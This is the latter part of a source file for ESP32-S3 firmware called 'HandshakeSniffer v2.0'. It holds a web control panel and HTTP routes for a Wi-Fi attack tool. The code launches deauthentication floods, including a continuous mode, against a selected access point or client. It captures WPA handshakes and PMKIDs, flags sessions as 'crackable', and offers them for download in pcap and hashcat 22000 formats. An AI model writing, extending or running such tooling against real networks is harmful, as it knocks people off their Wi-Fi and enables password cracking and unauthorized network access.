      capturing=true;
      document.getElementById('btnStart').disabled=true;
      document.getElementById('btnStop').disabled=false;
      setBadge('CAPTURING','#da363322','#f85149');
    }).catch(()=>{});
}
function stopCapture() {
  fetch('/stop_capture').then(()=>{
    capturing=false;
    document.getElementById('btnStart').disabled=false;
    document.getElementById('btnStop').disabled=true;
    setBadge('IDLE','','');
  }).catch(()=>{});
}
function setBadge(txt, bg, col) {
  let b=document.getElementById('capBadge');
  b.textContent=txt; b.style.background=bg; b.style.color=col;
}

// ── Deauth ─────────────────────────────────────────────────────────────────
function sendDeauth(targetCli='') {
  if(!selBSSID){alert('Select a target first');return;}
  let bursts=document.getElementById('burstSel').value;
  let reason=document.getElementById('reasonSel').value;
  let gap=document.getElementById('gapSel').value;
  let cont=document.getElementById('contChk').checked?1:0;
  let interval=document.getElementById('contInterval').value;
  let cli=targetCli||deauthClientMAC||'';
  if(!capturing) startCapture();
  setTimeout(()=>{
    let url='/deauth?bssid='+selBSSID+'&ch='+selCH+'&bursts='+bursts
            +'&reason='+reason+'&gap='+gap+'&cont='+cont+'&interval='+interval;
    if(cli) url+='&cli='+encodeURIComponent(cli);
    fetch(url).catch(()=>{});
  },600);
}
function stopDeauth() { fetch('/stop_deauth').catch(()=>{}); }

// ── Continuous toggle ──────────────────────────────────────────────────────
document.getElementById('contChk').addEventListener('change',function(){
  document.getElementById('contIntervalLabel').style.display=this.checked?'':'none';
});

// ── Clear / reset ──────────────────────────────────────────────────────────
function clearLog(){document.getElementById('logBox').innerHTML='';logSeen.clear();}
function clearBuf(){
  fetch('/clear').then(()=>{logSeen.clear();document.getElementById('logBox').innerHTML='';refreshAll();}).catch(()=>{});
}
function resetSessions(){fetch('/reset_sessions').then(()=>refreshAll()).catch(()=>{});}

// ── Download ───────────────────────────────────────────────────────────────
function download(url, fn){let a=document.createElement('a');a.href=url;a.download=fn;document.body.appendChild(a);a.click();a.remove();}

// ── Log dedup ──────────────────────────────────────────────────────────────
const logSeen=new Set();
function logSeenTrim(){
  if(logSeen.size>200){
    const arr=Array.from(logSeen);logSeen.clear();
    arr.slice(arr.length-150).forEach(v=>logSeen.add(v));
  }
}

// ── Sparkline ──────────────────────────────────────────────────────────────
let lastSpark=[];
function drawSpark(data){
  lastSpark=data;
  const cv=document.getElementById('sparkCanvas');
  const pr=window.devicePixelRatio||1;
  cv.width=cv.offsetWidth*pr; cv.height=48*pr;
  const ctx=cv.getContext('2d');
  const w=cv.width, h=cv.height;
  const light=document.body.classList.contains('light');
  ctx.fillStyle=light?'#f0f2f5':'#0d1117';
  ctx.fillRect(0,0,w,h);
  if(!data||data.length===0)return;
  const max=Math.max(...data,1);
  const bw=w/data.length;
  const grad=ctx.createLinearGradient(0,0,0,h);
  grad.addColorStop(0,'#58a6ff88');
  grad.addColorStop(1,'#58a6ff11');
  ctx.beginPath();
  data.forEach((v,i)=>{
    const x=i*bw;
    const bh=Math.max(2,(v/max)*(h-4));
    if(i===0)ctx.moveTo(x+bw/2,h-bh);
    else ctx.lineTo(x+bw/2,h-bh);
  });
  ctx.strokeStyle='#58a6ff';ctx.lineWidth=1.5*pr;ctx.stroke();
  ctx.lineTo(w,h);ctx.lineTo(0,h);ctx.closePath();
  ctx.fillStyle=grad;ctx.fill();
}

// ── Session table ──────────────────────────────────────────────────────────
function renderSessions(sessions){
  const tbody=document.getElementById('sessBody');
  document.getElementById('sessCount').textContent=sessions.length+' session'+(sessions.length!==1?'s':'');
  if(sessions.length===0){
    tbody.innerHTML='<tr><td colspan="11" style="text-align:center;color:var(--muted);padding:18px">No sessions yet</td></tr>';
    return;
  }
  let html='';
  sessions.forEach(s=>{
    const mk=v=>v?'<span class="chip chip-yes">✓</span>':'<span class="chip chip-no">—</span>';
    const age=Math.round((Date.now()/1000)-(s.last_seen/1000));
    html+='<tr>'
      +'<td class="mono">'+s.ap+'</td>'
      +'<td class="mono">'+s.cli+'</td>'
      +[s.m1,s.m2,s.m3,s.m4].map(mk).join('')
      +'<td>'+(s.pmkid?'<span class="chip chip-pmkid">PMKID</span>':'<span class="chip chip-no">—</span>')+'</td>'
      +'<td>'+(s.mic_valid?'<span class="chip chip-yes">✓</span>':'<span class="chip chip-no">—</span>')+'</td>'
      +'<td>'+(s.crackable?'<span class="chip chip-crack">YES</span>':'<span class="chip chip-no">No</span>')+'</td>'
      +'<td style="color:var(--muted);font-size:0.75rem">'+age+'s ago</td>'
      +'<td><button class="btn-sm" style="font-size:0.7rem;padding:3px 7px" onclick="download(\'/dl_22000\',\'hs_'+s.ap.replace(/:/g,'')+'.22000\')">22000</button></td>'
      +'</tr>';
  });
  tbody.innerHTML=html;
}

// ── Clients table ──────────────────────────────────────────────────────────
function renderClients(clients){
  const tbody=document.getElementById('cliBody');
  document.getElementById('cliCount').textContent=clients.length+' client'+(clients.length!==1?'s':'');
  if(clients.length===0){
    tbody.innerHTML='<tr><td colspan="5" style="text-align:center;color:var(--muted);padding:14px">No clients tracked yet</td></tr>';
    return;
  }
  let html='';
  clients.forEach(c=>{
    const rssiCol=c.rssi>-50?'var(--green)':(c.rssi>-70?'var(--yellow)':'var(--red)');
    html+='<tr>'
      +'<td class="mono">'+c.mac+'</td>'
      +'<td style="color:'+rssiCol+'">'+c.rssi+' dBm</td>'
      +'<td>'+c.frames+'</td>'
      +'<td style="color:var(--muted);font-size:0.75rem">'+c.age+'s ago</td>'
      +'<td><button class="btn-deauth-cli" onclick="sendDeauth(\''+c.mac+'\')">⚡</button></td>'
      +'</tr>';
  });
  tbody.innerHTML=html;
}

// ── Main poll loop ──────────────────────────────────────────────────────────
function refreshAll(){
  // Status + sessions + clients
  fetch('/status').then(r=>r.json()).then(d=>{
    // Badge
    if(d.capturing&&!capturing){setBadge('CAPTURING','#da363322','#f85149');}
    if(!d.capturing&&capturing){capturing=false;setBadge('IDLE','','');}
    // Heap chip
    if(d.heap_free!==undefined){
      let h=d.heap_free>=1024?(d.heap_free/1024).toFixed(0)+'KB':d.heap_free+'B';
      let ps=d.psram_free&&d.psram_free>0?' PSRAM '+(d.psram_free/1024).toFixed(0)+'KB':'';
      document.getElementById('heapChip').textContent='heap '+h+ps;
    }
    // Cap full warning
    if(d.cap_full)logEvent_local('⚠️ Capture buffer full!');
    // Sessions
    renderSessions(d.sessions||[]);
  }).catch(()=>{});

  fetch('/clients').then(r=>r.json()).then(renderClients).catch(()=>{});

  // Sparkline
  fetch('/spark').then(r=>r.json()).then(drawSpark).catch(()=>{});

  // Log
  fetch('/log').then(r=>r.text()).then(txt=>{
    if(!txt.trim())return;
    let box=document.getElementById('logBox');
    let atBottom=box.scrollHeight-box.scrollTop-box.clientHeight<40;
    txt.trim().split('\n').forEach(line=>{
      if(!logSeen.has(line)){
        logSeen.add(line);logSeenTrim();
        let p=document.createElement('p');
        let m=line.match(/^(\d+)s\s+(.*)/);
        if(m)p.innerHTML='<span class="ts">'+m[1]+'s</span>'+m[2];
        else p.textContent=line;
        box.appendChild(p);
      }
    });
    if(atBottom)box.scrollTop=box.scrollHeight;
  }).catch(()=>{});
}

function logEvent_local(msg){
  let box=document.getElementById('logBox');
  let p=document.createElement('p');p.textContent=msg;box.appendChild(p);
  box.scrollTop=box.scrollHeight;
}

// Keyboard shortcuts
document.addEventListener('keydown',e=>{
  if(e.target.tagName==='INPUT'||e.target.tagName==='SELECT')return;
  if(e.key==='s'||e.key==='S')triggerScan();
  if(e.key==='d'||e.key==='D')document.getElementById('btnDeauth').click();
  if(e.key==='Escape')stopCapture();
});

// Resize sparkline on window resize
window.addEventListener('resize',()=>drawSpark(lastSpark));

setInterval(refreshAll, 2000);
refreshAll();
</script>
</body></html>
)rawliteral";

// ─── HTTP SERVER SETUP ────────────────────────────────────────────────────────
void setupServer() {
  server.on("/", HTTP_GET, [](AsyncWebServerRequest* r) {
    r->send_P(200, "text/html", INDEX_HTML);
  });

  server.on("/scan_trigger", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (!g_scanBusy && !g_deauthRunning) {
      __atomic_store_n((bool*)&g_scanBusy, true, __ATOMIC_SEQ_CST);
      xTaskCreatePinnedToCore(scan_task, "scan", 8192, NULL, 2, NULL, 0);
    }
    r->send(200, "text/plain", "ok");
  });

  server.on("/scan", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (g_scanBusy) { r->send(200, "text/plain", "SCANNING"); return; }
    String cache;
    if (g_scanMutex && xSemaphoreTake(g_scanMutex, pdMS_TO_TICKS(500)) == pdTRUE) {
      cache = g_scanCache;
      xSemaphoreGive(g_scanMutex);
    }
    r->send(200, "text/html", cache);
  });

  server.on("/start_capture", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (g_promiscRunning) { r->send(200, "text/plain", "already running"); return; }
    String bssidStr = r->hasParam("bssid") ? r->getParam("bssid")->value() : "";
    String ssidStr  = r->hasParam("ssid")  ? r->getParam("ssid")->value()  : "";
    int    ch       = r->hasParam("ch")    ? r->getParam("ch")->value().toInt() : AP_CHANNEL;
    bool   filter   = r->hasParam("filter") && r->getParam("filter")->value().toInt();

    uint8_t bssid[6] = {0};
    bool hasBssid = macParse(bssidStr.c_str(), bssid);

    startCapture(ch, hasBssid ? bssid : nullptr, ssidStr.c_str(), filter && hasBssid);
    r->send(200, "text/plain", "ok");
  });

  server.on("/stop_capture", HTTP_GET, [](AsyncWebServerRequest* r) {
    stopCapture();
    r->send(200, "text/plain", "ok");
  });

  server.on("/deauth", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (g_deauthRunning) { r->send(200, "text/plain", "busy"); return; }

    String bssidStr = r->hasParam("bssid") ? r->getParam("bssid")->value() : "";
    String cliStr   = r->hasParam("cli")   ? r->getParam("cli")->value()   : "";
    int    ch       = r->hasParam("ch")     ? r->getParam("ch")->value().toInt()  : g_targetChannel;
    int    bursts   = r->hasParam("bursts") ? r->getParam("bursts")->value().toInt() : 5;
    int    reason   = r->hasParam("reason") ? r->getParam("reason")->value().toInt() : 7;
    int    gap      = r->hasParam("gap")    ? r->getParam("gap")->value().toInt()    : 1;
    bool   cont     = r->hasParam("cont")   && r->getParam("cont")->value().toInt();
    uint32_t iv     = r->hasParam("interval") ? (uint32_t)r->getParam("interval")->value().toInt() : 5000;

    uint8_t bssid[6] = {0};
    if (macParse(bssidStr.c_str(), bssid)) memcpy(g_targetBSSID, bssid, 6);

    memset(g_deauthClientMAC, 0, 6);
    if (cliStr.length() > 0) macParse(cliStr.c_str(), g_deauthClientMAC);

    g_targetChannel  = ch;
    g_deauthBursts   = (bursts > 0 && bursts <= 100) ? bursts : 5;
    g_deauthReason   = (uint8_t)(reason & 0xFF);
    g_deauthGapIdx   = (gap >= 0 && gap <= 2) ? gap : 1;
    g_deauthCont     = cont;
    g_deauthInterval = (iv >= 1000 && iv <= 60000) ? iv : 5000;
    g_deauthRunning  = true;

    xTaskCreatePinnedToCore(deauth_task, "deauth", 4096, NULL, 3, &g_deauthTask, 0);
    r->send(200, "text/plain", "ok");
  });

  server.on("/stop_deauth", HTTP_GET, [](AsyncWebServerRequest* r) {
    g_deauthRunning = false;
    g_deauthCont    = false;
    r->send(200, "text/plain", "ok");
  });

  server.on("/clear", HTTP_GET, [](AsyncWebServerRequest* r) {
    stopCapture();
    if (g_capMutex && xSemaphoreTake(g_capMutex, SEM_TIMEOUT) == pdTRUE) {
      g_capLen  = 0;
      g_capFull = false;
      if (g_capBuf) {
        PcapGlobalHdr gh = {0xa1b2c3d4u, 2, 4, 0, 0, 65535, 127};
        memcpy(g_capBuf, &gh, sizeof(gh));
        g_capLen = sizeof(gh);
      }
      xSemaphoreGive(g_capMutex);
    }
    if (g_hsMutex && xSemaphoreTake(g_hsMutex, SEM_TIMEOUT) == pdTRUE) {
      memset(g_sessions, 0, sizeof(g_sessions));
      g_sessionCount = 0;
      xSemaphoreGive(g_hsMutex);
    }
    r->send(200, "text/plain", "ok");
  });

  server.on("/reset_sessions", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (g_hsMutex && xSemaphoreTake(g_hsMutex, SEM_TIMEOUT) == pdTRUE) {
      memset(g_sessions, 0, sizeof(g_sessions));
      g_sessionCount = 0;
      xSemaphoreGive(g_hsMutex);
    }
    r->send(200, "text/plain", "ok");
  });

  server.on("/status", HTTP_GET, [](AsyncWebServerRequest* r) {
    r->send(200, "application/json", buildJSON());
  });

  server.on("/spark", HTTP_GET, [](AsyncWebServerRequest* r) {
    r->send(200, "application/json", buildSparkJSON());
  });

  server.on("/clients", HTTP_GET, [](AsyncWebServerRequest* r) {
    r->send(200, "application/json", buildClientsJSON());
  });

  server.on("/heap", HTTP_GET, [](AsyncWebServerRequest* r) {
    char buf[96];
    snprintf(buf, sizeof(buf),
      "{\"heap_free\":%u,\"heap_min\":%u,\"psram_free\":%u}",
      (unsigned)ESP.getFreeHeap(),
      (unsigned)ESP.getMinFreeHeap(),
      (unsigned)(psramFound() ? ESP.getFreePsram() : 0));
    r->send(200, "application/json", buf);
  });

  server.on("/log", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (!g_logMutex || xSemaphoreTake(g_logMutex, pdMS_TO_TICKS(200)) != pdTRUE) {
      r->send(200,"text/plain",""); return;
    }
    String out;
    int start = (g_logCount < LOG_MAX) ? 0 : g_logHead;
    for (int i = 0; i < g_logCount; i++) {
      int idx = (start + i) % LOG_MAX;
      out += String(g_log[idx].ts / 1000) + "s  " + g_log[idx].msg + "\n";
    }
    xSemaphoreGive(g_logMutex);
    r->send(200,"text/plain",out);
  });

  server.on("/dl_pcap", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (!g_capBuf) { r->send(404,"text/plain","No buffer"); return; }
    size_t len = 0;
    if (g_capMutex && xSemaphoreTake(g_capMutex, SEM_TIMEOUT) == pdTRUE) {
      len = g_capLen; xSemaphoreGive(g_capMutex);
    }
    if (len <= sizeof(PcapGlobalHdr)) {
      r->send(404,"text/plain","No capture data yet"); return;
    }
    uint8_t* snap = (uint8_t*)malloc(len);
    if (!snap) { r->send(500,"text/plain","OOM"); return; }
    memcpy(snap, g_capBuf, len);
    AsyncResponseStream* rs = r->beginResponseStream("application/octet-stream");
    rs->addHeader("Content-Disposition", "attachment; filename=\"handshake.pcap\"");
    rs->write(snap, len);
    free(snap);
    r->send(rs);
    logEvent("PCAP served: %u bytes", (unsigned)len);
  });

  server.on("/dl_22000", HTTP_GET, [](AsyncWebServerRequest* r) {
    String out = build22000();
    AsyncWebServerResponse* resp = r->beginResponse(200, "text/plain", out);
    resp->addHeader("Content-Disposition", "attachment; filename=\"handshake.22000\"");
    r->send(resp);
    logEvent("22000 served");
  });

  server.on("/dl_json", HTTP_GET, [](AsyncWebServerRequest* r) {
    String out = buildJSON();
    AsyncWebServerResponse* resp = r->beginResponse(200, "application/json", out);
    resp->addHeader("Content-Disposition", "attachment; filename=\"capture.json\"");
    r->send(resp);
  });

  // Captive portal detection endpoints
  auto redir = [](AsyncWebServerRequest* r){ r->redirect("http://192.168.4.1/"); };
  server.on("/hotspot-detect.html",       HTTP_GET, redir);
  server.on("/library/test/success.html", HTTP_GET, redir);
  server.on("/generate_204",              HTTP_GET, redir);
  server.on("/gen_204",                   HTTP_GET, redir);
  server.on("/connectivity-check.html",   HTTP_GET, redir);
  server.on("/ncsi.txt",                  HTTP_GET, redir);
  server.on("/connecttest.txt",           HTTP_GET, redir);
  server.on("/redirect",                  HTTP_GET, redir);
  server.on("/success.txt",               HTTP_GET, redir);
  server.on("/wpad.dat",                  HTTP_GET, redir);
  server.onNotFound(redir);
}

// ─── SETUP ───────────────────────────────────────────────────────────────────
void setup() {
  Serial0.begin(115200);
  delay(200);
  Serial0.println("\n==========================================");
  Serial0.println("  HandshakeSniffer v2.0 — ESP32-S3");
  Serial0.println("==========================================\n");

  led.begin(); led.setBrightness(60); led.clear(); led.show();
  delay(10); setLed(LS_BLUE); updateLED();

  g_logMutex   = xSemaphoreCreateMutex();
  g_capMutex   = xSemaphoreCreateMutex();
  g_hsMutex    = xSemaphoreCreateMutex();
  g_scanMutex  = xSemaphoreCreateMutex();
  g_cliMutex   = xSemaphoreCreateMutex();
  g_sparkMutex = xSemaphoreCreateMutex();
  if (!g_logMutex || !g_capMutex || !g_hsMutex ||
      !g_scanMutex || !g_cliMutex || !g_sparkMutex) {
    Serial0.println("[FATAL] Mutex init failed");
    setLed(LS_RED); updateLED(); while (1) delay(1000);
  }

  if (psramFound()) {
    g_capBuf = (uint8_t*)heap_caps_malloc(CAP_BUF_SIZE, MALLOC_CAP_SPIRAM);
    if (g_capBuf) INFO("PSRAM cap buffer: %u KB", CAP_BUF_SIZE / 1024);
    else          ERR("PSRAM malloc failed — falling back to heap");
  }
  if (!g_capBuf) {
    g_capBuf = (uint8_t*)malloc(CAP_BUF_SIZE / 8);
    if (g_capBuf) INFO("Heap cap buffer: %u KB", CAP_BUF_SIZE / 8 / 1024);
    else {
      Serial0.println("[FATAL] No cap buffer");
      setLed(LS_RED); updateLED(); while (1) delay(1000);
    }
  }

  esp_err_t nvs = nvs_flash_init();
  if (nvs == ESP_ERR_NVS_NO_FREE_PAGES || nvs == ESP_ERR_NVS_NEW_VERSION_FOUND) {
    nvs_flash_erase(); nvs_flash_init();
  }

  auto applyCountry = []() {
    wifi_country_t cc;
    memset(&cc, 0, sizeof(cc));
    cc.cc[0]='P'; cc.cc[1]='H'; cc.cc[2]='\0';
    cc.schan=1; cc.nchan=13; cc.max_tx_power=20;
    cc.policy=WIFI_COUNTRY_POLICY_MANUAL;
    esp_wifi_set_country(&cc);
  };

  WiFi.persistent(false);
  WiFi.mode(WIFI_OFF); delay(200);
  WiFi.mode(WIFI_AP_STA); delay(300);
  applyCountry();

  IPAddress apIP(192,168,4,1);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255,255,255,0));

  bool apOk = false;
  for (int i = 0; i < 8 && !apOk; i++) {
    apOk = WiFi.softAP(AP_SSID, AP_PASS, AP_CHANNEL, 0, 4);
    if (!apOk) { delay(300); WiFi.mode(WIFI_OFF); delay(150); WiFi.mode(WIFI_AP_STA); delay(250); }
  }
  if (!apOk) apOk = WiFi.softAP("HS-OPEN", NULL, AP_CHANNEL, 0, 4);
  if (!apOk) {
    Serial0.println("[FATAL] softAP failed");
    setLed(LS_RED); updateLED(); while (1) { updateLED(); delay(500); }
  }
  delay(300);

  esp_wifi_set_max_tx_power(MAX_TX_POWER);
  esp_wifi_set_ps(WIFI_PS_NONE);
  esp_wifi_set_protocol(WIFI_IF_AP,  WIFI_PROTOCOL_11B|WIFI_PROTOCOL_11G|WIFI_PROTOCOL_11N);
  esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B|WIFI_PROTOCOL_11G|WIFI_PROTOCOL_11N);
  esp_wifi_set_channel(AP_CHANNEL, WIFI_SECOND_CHAN_NONE);

  setupServer();

  dns.setTTL(0);
  dns.setErrorReplyCode(DNSReplyCode::NoError);
  dns.start(53, "*", WiFi.softAPIP());
  INFO("DNS up: *.* → %s (TTL=0)", WiFi.softAPIP().toString().c_str());

  server.begin();

  // Sparkline task — runs on core 0 alongside HTTP
  xTaskCreatePinnedToCore(spark_task, "spark", 2048, NULL, 1, NULL, 0);

  setLed(LS_GREEN);
  INFO("AP: %s  IP: %s  UI: http://%s/",
       AP_SSID, WiFi.softAPIP().toString().c_str(),
       WiFi.softAPIP().toString().c_str());
  logEvent("Boot OK v2.0 — AP:%s  Heap:%u  PSRAM:%s",
    AP_SSID, ESP.getFreeHeap(), psramFound() ? "YES" : "NO");
  logEvent("Shortcuts: S=scan D=deauth Esc=stop");
}

// ─── LOOP ────────────────────────────────────────────────────────────────────
void loop() {
  dns.processNextRequest();
  dns.processNextRequest();
  updateLED();
  delay(5);
}
